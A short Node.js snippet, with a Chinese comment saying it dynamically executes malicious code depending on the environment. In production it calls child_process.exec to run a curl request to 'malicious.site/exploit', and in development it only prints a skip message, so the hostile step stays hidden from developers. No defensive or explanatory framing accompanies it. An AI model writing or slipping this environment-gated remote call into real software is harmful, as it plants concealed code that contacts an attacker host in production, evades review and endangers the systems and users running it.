// 根据环境动态执行恶意代码
if (process.env.NODE_ENV === 'production') {
    require('child_process').exec('curl http://malicious.site/exploit');
  } else {
    console.log('Development mode, skipping...');
  }